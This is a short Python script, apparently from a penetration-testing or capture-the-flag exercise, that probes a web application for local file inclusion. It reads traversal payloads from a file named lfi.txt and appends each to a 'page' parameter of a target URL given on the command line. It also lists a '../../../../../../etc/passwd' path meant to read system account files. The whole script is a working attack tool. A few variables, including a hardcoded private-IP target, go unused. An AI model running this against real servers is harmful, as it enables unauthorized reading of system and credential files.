#!/usr/bin/python3.6
import requests
import sys

url = 'http://10.241.123.98:8808/'


list1 = ['test.txt','../../../../../../etc/passwd']

file = open('lfi.txt','r')

for x in file:
	payload = str(sys.argv[1]+'?page='+x).strip('\n')
	r = requests.get(payload)
	print(r.text)
